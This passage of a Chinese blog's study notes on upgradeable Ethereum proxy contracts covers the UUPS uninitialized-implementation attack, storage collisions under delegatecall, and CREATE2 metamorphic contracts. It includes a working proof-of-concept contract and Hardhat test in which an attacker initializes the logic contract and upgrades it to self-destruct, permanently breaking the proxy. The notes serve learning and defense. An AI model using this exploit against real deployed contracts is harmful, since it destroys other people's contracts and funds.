+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.2;<br><br>import &quot;@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol&quot;;<br>import &quot;@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol&quot;;<br>import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol&quot;;<br>import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol&quot;;<br><br>contract SimpleToken is Initializable, ERC20Upgradeable, OwnableUpgradeable, UUPSUpgradeable &#123;<br>    /// @custom:oz-upgrades-unsafe-allow constructor<br>    // constructor() initializer &#123;&#125;<br>   //这里不应该出现constructor 的初始化，但是initializer事实上只是进行了一个判断，即该函数的调用过程是否在初始化过程中involve了，它并没有进行状态的改变。<br><br>    function initialize() initializer public &#123;<br>        __ERC20_init(&quot;testToken&quot;, &quot;MTK&quot;);<br>        __Ownable_init();<br>        __UUPSUpgradeable_init();<br>    &#125;<br><br>    function mint(address to, uint256 amount) public onlyOwner &#123;<br>        _mint(to, amount);<br>    &#125;<br><br>    function _authorizeUpgrade(address newImplementation)<br>        internal<br>        onlyOwner<br>        override<br>    &#123;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p><strong>POC</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.2;<br><br>import &quot;@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol&quot;;<br><br>// Fun Fact: An ExplodingKitten can be exploded by another ExplodingKitten<br>contract ExplodingKitten is UUPSUpgradeable &#123;<br>  bytes32 private constant _ROLLBACK_SLOT =<br>    0x4910fdfa16fed3260ed0e7147f7cc6da11a60208b5b9406d12a635614ffd9143;<br><br>  function explode() public &#123;<br>    StorageSlotUpgradeable.BooleanSlot<br>      storage rollbackTesting = StorageSlotUpgradeable.getBooleanSlot(<br>        _ROLLBACK_SLOT<br>      );<br>    rollbackTesting.value = true;<br>    selfdestruct(payable(msg.sender));<br>  &#125;<br><br>  // Any can call upgrade<br>  function _authorizeUpgrade(address newImplementation) internal override &#123;&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>ts 测试</p>
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-keyword">import</span> &#123; expect &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;chai&quot;</span>;<br><span class="hljs-keyword">import</span> &#123; utils &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;ethers&quot;</span>;<br><span class="hljs-keyword">import</span> &#123; ethers, upgrades &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;hardhat&quot;</span>;<br><br><span class="hljs-keyword">const</span> IMPLEMENTATION_SLOT =<br>  <span class="hljs-string">&quot;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&quot;</span>;<br><br><span class="hljs-keyword">const</span> getImplementationAddress = <span class="hljs-keyword">async</span> (proxyAddress: <span class="hljs-built_in">string</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> implementationAddressFromStorage = <span class="hljs-keyword">await</span> ethers.provider.getStorageAt(<br>    proxyAddress,<br>    IMPLEMENTATION_SLOT<br>  );<br>  <span class="hljs-keyword">return</span> utils.getAddress(<br>    utils.hexDataSlice(implementationAddressFromStorage, <span class="hljs-number">32</span> - <span class="hljs-number">20</span>)<br>  );<br>&#125;;<br><br>describe(<span class="hljs-string">&quot;ExplodingKitten&quot;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  it(<span class="hljs-string">&quot;should destroy an UUPS proxy with unguarded logic contract irrecoverably&quot;</span>, <span class="hljs-keyword">async</span> () =&gt; &#123;<br>    <span class="hljs-keyword">const</span> [deployer, attacker] = <span class="hljs-keyword">await</span> ethers.getSigners();<br>    <span class="hljs-comment">// 以 uups 的可升级模式部署合约，模式选择参见：https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/plugin-truffle/src/deploy-proxy.ts</span><br>    <span class="hljs-keyword">const</span> SimpleToken = <span class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&quot;SimpleToken&quot;</span>);<br>    <span class="hljs-keyword">const</span> simpleToken = <span class="hljs-keyword">await</span> upgrades.deployProxy(SimpleToken, &#123;<br>      <span class="hljs-attr">kind</span>: <span class="hljs-string">&quot;uups&quot;</span>,<br>    &#125;);<br>    <span class="hljs-comment">// 获得逻辑合约地址</span><br>    <span class="hljs-keyword">const</span> implementationAddress = <span class="hljs-keyword">await</span> getImplementationAddress(<br>      simpleToken.address<br>    );<br><br>    <span class="hljs-comment">// Do something on proxy first</span><br>    <span class="hljs-comment">// 铸币</span><br>    <span class="hljs-keyword">await</span> simpleToken.mint(deployer.address, <span class="hljs-number">1000</span>);<br><br>    <span class="hljs-comment">// Verify correct behavior</span><br>    <span class="hljs-comment">// 验证铸币结果</span><br>    expect(<span class="hljs-keyword">await</span> simpleToken.balanceOf(deployer.address)).to.equal(<span class="hljs-number">1000</span>);<br>    expect(<span class="hljs-keyword">await</span> simpleToken.totalSupply()).to.equal(<span class="hljs-number">1000</span>);<br><br>    <span class="hljs-comment">// Verify logic contract is non-zero</span><br>    <span class="hljs-comment">// 验证逻辑合约非零</span><br>    expect(<span class="hljs-keyword">await</span> ethers.provider.getCode(implementationAddress)).to.not.equal(<br>      <span class="hljs-string">&quot;0x&quot;</span><br>    );<br><br>    <span class="hljs-comment">// Begin exploit</span><br>    <span class="hljs-comment">// 开始攻击</span><br>    <span class="hljs-comment">// 部署攻击合约</span><br>    <span class="hljs-keyword">const</span> ExplodingKitten = <span class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&quot;ExplodingKitten&quot;</span>);<br>    <span class="hljs-keyword">const</span> explodingKitten = <span class="hljs-keyword">await</span> ExplodingKitten.connect(attacker).deploy();<br>    <span class="hljs-comment">// 攻击者初始化逻辑合约</span><br>    <span class="hljs-comment">// contract.attach(addressOrName) 会返回附加到新地址的合同的新实例</span><br>    <span class="hljs-comment">// contractFactory.attach(address) 会返回附加到地址的合同实例</span><br>    <span class="hljs-comment">// 参见：https://docs.ethers.io/v5/search/?search=attach</span><br>    <span class="hljs-keyword">await</span> simpleToken<br>      .attach(implementationAddress)<br>      .connect(attacker)<br>      .initialize();<br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;implementationAddress&quot;</span>, implementationAddress);<br>    <span class="hljs-comment">// 将逻辑合约升级至自己的攻击合约，并 delegatecall 攻击函数</span><br>    <span class="hljs-keyword">await</span> simpleToken<br>      .attach(implementationAddress)<br>      .connect(attacker)<br>      .upgradeToAndCall(explodingKitten.address, <span class="hljs-string">&quot;0xb8b3dbc6&quot;</span>);<br><br>    <span class="hljs-comment">// Verify logic contract is zero</span><br>    <span class="hljs-comment">// 验证逻辑合约为0</span><br>    expect(<span class="hljs-keyword">await</span> ethers.provider.getCode(implementationAddress)).to.equal(<span class="hljs-string">&quot;0x&quot;</span>);<br><br>    <span class="hljs-comment">// Verify that proxy is no longer functioning</span><br>    <span class="hljs-comment">// 验证代理不再运行</span><br>    <span class="hljs-keyword">await</span> expect(simpleToken.balanceOf(deployer.address)).to.be.reverted;<br>    <span class="hljs-keyword">await</span> expect(simpleToken.totalSupply()).to.be.reverted;<br><br>    <span class="hljs-comment">// Verify that proxy can no longer upgrade</span><br>    <span class="hljs-comment">// 验证代理不能再进行升级</span><br>    <span class="hljs-keyword">const</span> SimpleTokenV2 = <span class="hljs-keyword">await</span> ethers.getContractFactory(<span class="hljs-string">&quot;SimpleTokenV2&quot;</span>);<br>    <span class="hljs-keyword">const</span> simpleTokenV2 = <span class="hljs-keyword">await</span> SimpleTokenV2.deploy();<br>    <span class="hljs-comment">// Tx 不会失败，因为它与现在发送到没有代码的地址相同</span><br>    <span class="hljs-keyword">await</span> simpleToken.upgradeTo(simpleTokenV2.address); <span class="hljs-comment">// Tx not failing as it&#x27;s same as sending to an address without code now</span><br><br>    <span class="hljs-comment">// Verify that the implementation code did not upgrade and is irrecoverable</span><br>    <span class="hljs-comment">// 验证实现代码未升级且不可恢复</span><br>    expect(<span class="hljs-keyword">await</span> getImplementationAddress(simpleToken.address)).to.equal(<br>      implementationAddress<br>    );<br>    <span class="hljs-keyword">await</span> expect(simpleToken.balanceOf(deployer.address)).to.be.reverted;<br>    <span class="hljs-keyword">await</span> expect(simpleToken.totalSupply()).to.be.reverted;<br>  &#125;);<br>&#125;);<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="存储冲突"><a href="#存储冲突" class="headerlink" title="存储冲突"></a>存储冲突</h2><p>也就是 delegatecall 和 变量声明顺序的问题</p>
+<h3 id="存储方式"><a href="#存储方式" class="headerlink" title="存储方式"></a>存储方式</h3><p><a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/v0.8.16/internals/layout_in_storage.html">Solidity 状态变量在存储中的布局</a></p>
+<p>转自：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://mixbytes.io/blog/storage-upgradable-ethereum-smart-contracts">https://mixbytes.io/blog/storage-upgradable-ethereum-smart-contracts</a></li>
+</ul>
+<h4 id="每个版本单独存储"><a href="#每个版本单独存储" class="headerlink" title="每个版本单独存储"></a>每个版本单独存储</h4><p>第一种方法意味着每个版本分别将其状态存储在自己的存储中。这确保了最大程度的隔离和控制，排除了冲突，但增加了将单独的记录迁移到存储所产生的复杂性和 gas 成本。让我们假设正在开发一个基本的代币合约。在这种情况下，核心数据是余额：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">mapping (address =&gt; uint256) private _balances;<br></code></pre></td></tr></table></figure>
+
+<p>从新版本直接调用 _balances 是不可能的；为此，必须首先从以前的版本迁移数据。请注意，迁移只能执行一次。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">mapping (address =&gt; uint256) private _balances;<br><br>// previous version of a token smart contract<br>ERC20 private _previous;<br><br>// flag indicates that migration of certain user balance was performed<br>mapping (address =&gt; bool) private _migrated;<br><br>function balanceOf(address owner) public view returns (uint256) &#123;<br>    return _migrated[owner] ? _balances[owner] : _previous.balanceOf(owner);<br>&#125;<br><br>function setBalance(address owner, uint256 new_balance) private &#123;<br>    _balances[owner] = new_balance;<br>    if (!_migrated[owner])<br>        _migrated[owner] = true;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/13/upgradeable/image-20221112214123081.png" srcset="/img/loading.gif" lazyload alt="image-20221112214123081"></p>
+<p>此时会出现其他问题：无法根据任何请求在现场进行迁移，因为可能需要将数据记录到存储中，并且在仅查看功能中不可用。因此，所有对余额的请求，甚至是内部请求，都必须通过 balanceOf 和 setBalance 函数执行。样板代码更高，更不用说增加气体消耗了。</p>
+<p>在最坏的情况下，对仅查看功能的调用会遍历整个令牌版本链收集数据并且无法记录与最新版本相关的操作结果，因为它们没有修改权限。从最新版本以外的其他版本调用这些函数是可能的，但意义不大。</p>
+<p>在最新的令牌代码版本中同时为当前用户迁移数据和记录操作结果需要调用可以改变最新版本状态的函数。因此，对任何其他函数的进一步调用将不会通过整个令牌版本链。只允许代理合约调用改变最新版本状态的函数；对于以前的版本，必须完全拒绝访问这些功能。</p>
+<h4 id="作为数据库的合同"><a href="#作为数据库的合同" class="headerlink" title="作为数据库的合同"></a>作为数据库的合同</h4><p>传统程序是如何解决这个问题的。数据与代码分离！此外，当涉及到复杂的程序和系统时，数据存储在 SQL 或 NoSQL 存储中。</p>
+<p>为此目的编写的临时智能合约可以用作存储。因此，无论当前的代币代码版本如何，数据都将始终保存在该合约的存储中。该合约的代码可以移动到库中，但现在不在议程上。无需将数据从存储迁移到存储；相反，存储访问权限从一个版本转移到另一个版本。然而，使用这种类型的存储并非没有问题。它将需要定义一个可用于任何版本的代币智能合约的接口，例如类似 SQL 的或面向文档的。说到这种存储类型的例子，看看 EOS 表。<em>让我们在数据方案</em></p>
+<p>下统一结构、字段名和数据类型伞。存储智能合约代码可以由静态部分（无论当前数据方案如何都不会改变的代码）和动态部分（方案相关代码）组成。它是包含大量样板代码的动态部分，因此自动生成它很有意义，因为它是在 Protocol Buffers 或 Apache Thrift 中实现的。我碰巧在 ETHBerlin 黑客马拉松上处理了开发<a target="_blank" rel="noopener" href="https://github.com/mixbytes/ethereum-cdf">以太坊列式数据存储原型的类似任务。</a></p>
+<p>数据项由以下结构描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct Cafe &#123;<br>        string name;<br>        uint32 latitude;<br>        uint32 longitude;<br>        address owner;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/mixbytes/ethereum-cdf/blob/master/contracts/CafeIO.sol">..我们为GitHub</a>生成一个“驱动程序” 。<a target="_blank" rel="noopener" href="https://github.com/mixbytes/ethereum-cdf/blob/master/contracts/CDF.sol">驱动程序从Github</a>调用静态代码，例如<code>CDF.writeString</code>、<code>CDF.chunkDataPosition</code>和其他函数。</p>
+<p>正如我已经提到的，该<a target="_blank" rel="noopener" href="http://ethereum-cdf/">解决方案</a>涵盖了其他问题，并作为外部存储操作的示例。目前，我所知道的以太坊智能合约存储上没有 SQL/NoSQL 存储的有效实现。这似乎是一个有趣的话题，似乎是解决可变智能合约中数据存储问题的有希望的解决方案。</p>
+<p><img src="/2022/11/13/upgradeable/image-20221112214601260.png" srcset="/img/loading.gif" lazyload alt="image-20221112214601260"></p>
+<p>状态存储在用作 DB 的合约中，并通过调用而不是delegatecall指令调用。对写调用的访问应该受到保护，并且只对代理合约可用。这个数据库合约的公共代码可以移动到一个库中。</p>
+<h4 id="委托调用并将数据存储在代理合约中"><a href="#委托调用并将数据存储在代理合约中" class="headerlink" title="委托调用并将数据存储在代理合约中"></a>委托调用并将数据存储在代理合约中</h4><p>最后，第三种选择是将数据存储在代理合约存储中。如果代理是独立的智能合约，特定代码版本如何访问数据？EVM 委托调用功能使之成为可能。它在目标地址执行代码，但使用执行委托调用指令的合约的存储空间（参见<a target="_blank" rel="noopener" href="https://solidity.readthedocs.io/en/v0.5.4/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-callcode-and-libraries">Solidity</a>的更多信息）。</p>
+<p><img src="/2022/11/13/upgradeable/image-20221112214906050.png" srcset="/img/loading.gif" lazyload alt="image-20221112214906050"></p>
+<p>调用以前合约版本的函数没有什么意义，因为这些只是“代码片段”，所有状态都存储在代理合约中。<em>Delegatecall</em>用于调用库合约。库代码通过指针轻松定位必要的数据。但是，该指令可能对代理合同构成潜在威胁。不幸的是，官方的 Solidity 文档几乎没有用注释警告我们：“如果通过低级委托调用访问状态变量，则两个合约的存储布局必须对齐，以便被调用的合约正确访问调用的存储变量名义上的契约。”</p>
+<h3 id="冲突-1"><a href="#冲突-1" class="headerlink" title="冲突"></a>冲突</h3><p><a target="_blank" rel="noopener" href="https://mixbytes.io/blog/collisions-solidity-storage-layouts">参考1</a></p>
+<p><a target="_blank" rel="noopener" href="https://medium.com/taipei-ethereum-meetup/solidity-data-collision-51e88f1529a8">参考2</a></p>
+<p>一组简单的问题合约</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity 0.8.1;<br><br>contract LostStorage &#123;<br>    address public myAddress;<br>    uint public myUint;<br><br>    function setAddress(address _address) public &#123;<br>        myAddress = _address;<br>    &#125;<br><br>    function setMyUint(uint _uint) public &#123;<br>        myUint = _uint;<br>    &#125;<br><br>&#125;<br><br>contract ProxyClash &#123;<br>    address public otherContractAddress;<br><br>    constructor(address _otherContract) &#123;<br>        otherContractAddress = _otherContract;<br>    &#125;<br><br>    function setOtherAddress(address _otherContract) public &#123;<br>        otherContractAddress = _otherContract;<br>    &#125;<br><br>  fallback() external &#123;<br>    address _impl = otherContractAddress;<br><br>    assembly &#123;<br>      let ptr := mload(0x40)<br>      calldatacopy(ptr, 0, calldatasize())<br>      let result := delegatecall(gas(), _impl, ptr, calldatasize(), 0, 0)<br>      let size := returndatasize()<br>      returndatacopy(ptr, 0, size)<br><br>      switch result<br>      case 0 &#123; revert(ptr, size) &#125;<br>      default &#123; return(ptr, size) &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>会发生：</p>
+<ol>
+<li>部署 LostStorage 合约</li>
+<li>部署 Proxy，将 LostStorage 合约地址设置为构造函数参数</li>
+<li>告诉 Remix LostStorage 正在 Proxy 地址上运行</li>
+<li>call <code>myAddress()</code>。它令人惊讶地返回一个非零地址。砰！碰撞。</li>
+</ol>
+<h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>代理合约对逻辑合约的调用是使用 delegatecall</p>
+<p>当A合约对B合约执行 delegatecall 时，B合约的函式会被执行，但对 storage 的操作都会作用在A合约上。举例如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract A &#123;<br>    uint256 public value;<br><br>    function add(address b, uint256 x, uint256 y) public returns (bool) &#123;<br>        (bool success,) = b.delegatecall(<br>            abi.encodeWithSelector(<br>                bytes4(keccak256(&#x27;add(uint256,uint256)&#x27;)),<br>                x,<br>                y<br>            )<br>        );<br>        return success;<br>    &#125;<br>&#125;<br><br>contract B &#123;<br>    uint256 public value;<br><br>    function add(uint256 x, uint256 y) public returns (uint256) &#123;<br>        value = x + y;<br>        return value;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>other</code>但假若多少在其中加了一个栏位，<code>_value</code>执行合约之后<code>other</code>反而栏位被改了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract A &#123;<br>    uint256 public other;<br>    uint256 public value;<br><br>    function add(address b, uint256 x, uint256 y) public returns (bool) &#123;<br>        (bool success,) = b.delegatecall(<br>            abi.encodeWithSelector(<br>                bytes4(keccak256(&#x27;add(uint256,uint256)&#x27;)),<br>                x,<br>                y<br>            )<br>        );<br>        return success;<br>    &#125;<br>&#125;<br><br>contract B &#123;<br>    uint256 public value;<br><br>    function add(uint256 x, uint256 y) public returns (uint256) &#123;<br>        value = x + y;<br>        return value;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><p>OpenZeppelin 处理的方法很简单，就是将<code>_implementation</code>换地方摆。以特定字串的杂凑值作为 Slot Index，存储实现的地址。</p>
+<p>当然，<a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/v0.8.14/internals/layout_in_storage.html#mappings-and-dynamic-arrays">当通过 keccak256 计算</a>其存储槽时，任何条目都有可能产生冲突，参阅<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/4014090/is-it-safe-to-ignore-the-possibility-of-sha-collisions-in-practice/4014407#4014407">可能性</a></p>
+<h2 id="CREATE2"><a href="#CREATE2" class="headerlink" title="CREATE2"></a>CREATE2</h2><p>create操作码用于在以太坊区块链上部署合约。合约地址是通过散列部署者的地址和该地址的nonce来生成的。Nonce是一个标量值，等于从部署者的地址发送的交易数量。同样，在合约账户的情况下，nonce是该账户创建合约的数量。nonce有助于保持交易的顺序（来自一个地址的低nonce交易会先被开采），并防止重入攻击。nonce是一个递增的数字，防止create操作码产生重复的地址。只要在当前和下一个nonce之间没有新的交易发生，就有可能通过简单散列下一个nonce和地址来知道下一个合约的地址。</p>
+<p>create2操作码被添加到以太坊虚拟机中，作为君士坦丁堡硬分叉的一部分，这个操作码也被用来部署智能合约。create2使用一些用户控制的输入来推导出智能合约的地址。换句话说，这个操作码提供了一种方法，在将智能合约部署到区块链之前计算其地址。这个操作码不是对部署者的地址和nonce进行散列，而是对部署者的地址、salt（由部署者提供的32字节的字符串）和合约的字节码的哈希进行散列。由于这个操作码的所有参数都由用户控制，create2提供了一种预先确定合约地址的方法。这个方法在推导出优化gas的合约地址和实现像状态通道这样的扩展解决方案时非常有用。在可升级性方面，create2提供了创建可变合约（metamorphic contract）的能力，这些合约可以用新的字节码重新部署到同一地址。</p>
+<p>EVM包含一个selfdestruct 操作码，智能合约可以通过这个操作码来删除。为了在原始地址上部署一个新的字节码，该地址必须是自由的，因为智能合约是不可改变的。有几种方法可以将新的字节码部署到原始地址上，一个低效的方法是找到salt的参数，与新的字节码相结合，生成原始地址，寻找正确的salt参数的计算可以在链下完成。然而，这并不是一个很好的方法。另一个选择是部署一个可变合约。如上所述，可变合约可以使用不同的字节码重新部署到原始地址。</p>
+<p>建立一个良好的升级模式，需要一个可变合约工厂。这个可变合约工厂的目的是通过改变其实现而不改变其地址来促进升级。在部署合约时，对应的部署函数使用create2预先计算可变合约的地址，实现合约是使用传统的create操作码部署的。这个操作码使用地址和nonce来生成地址，并将合约部署到该地址。要求实现地址不能为零。否则，实现合约没有被正确部署，函数必须返回。部署完实现合约后，工厂状态被更新来存储当前的实现合约。</p>
+<p>值得注意的是，实现合约必须是自毁的，这也会使可变合约自毁。在重新部署可变合约之前，要确保可变合约使用selfdestruct操作码进行自我销毁。由于create2操作码的存在，可变合约的地址总是提前知道的。此外，由于它能够改变其实现，可变合约每次都可以用不同的实现重新部署。</p>
+<p>使用create2是有优势的，但它也有自己的风险。最重要的风险是，每次合约被重新部署时，其存储都会被抹去。另外，带有selfdestruct操作码的实现合约可能不是一个可靠的资金存储方式。因此，在采用这种智能合约升级模式之前，开发者必须谨慎行事。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Etherum/">#Etherum</a>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E/">#漏洞</a>
+      
+        <a href="/tags/EIP/">#EIP</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>代理合约学习笔记</div>
+      <div>http://example.com/2022/11/13/upgradeable/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Sissice</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年11月13日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/31/erc777/" title="ERC777">
+                        <span class="hidden-mobile">ERC777</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
